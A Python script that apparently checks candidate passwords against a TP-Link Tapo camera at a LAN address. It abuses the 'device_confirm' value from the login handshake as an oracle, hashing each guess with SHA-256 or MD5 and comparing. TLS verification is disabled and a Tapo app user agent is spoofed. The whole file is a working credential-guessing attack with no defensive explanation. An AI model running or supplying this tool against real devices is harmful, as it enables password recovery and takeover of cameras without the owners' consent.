#!/usr/bin/env python3
"""Check candidate passwords against the device_confirm oracle for a given username."""
import hashlib, json, os, ssl, sys, urllib.request

URL = "https://192.168.4.70/"
CTX = ssl._create_unverified_context()


def post(obj, ua="Tapo CameraClient Android"):
    req = urllib.request.Request(URL, data=json.dumps(obj).encode(),
                                 headers={"Content-Type": "application/json", "User-Agent": ua})
    with urllib.request.urlopen(req, context=CTX, timeout=8) as r:
        return json.loads(r.read())


def negotiate(user):
    cn = os.urandom(8).hex().upper()
    d = post({"method": "login", "params": {"cnonce": cn, "encrypt_type": "3", "username": user}})
    data = d["result"]["data"]
    return cn, data["nonce"], data["device_confirm"], data


def verify(user, cand):
    cn, nonce, dc, data = negotiate(user)
    for hname in ("sha256", "md5"):
        h = hashlib.new(hname, cand.encode()).hexdigest().upper()
        calc = (hashlib.sha256((cn + h + nonce).encode()).hexdigest().upper() + nonce + cn)
        if calc == dc:
            return hname, h, data
    return None


if __name__ == "__main__":
    user = sys.argv[1]
    print(json.dumps({k: v for k, v in negotiate(user)[3].items() if k != "key"}, indent=1))
    for cand in sys.argv[2:]:
        print(repr(cand), "->", verify(user, cand))
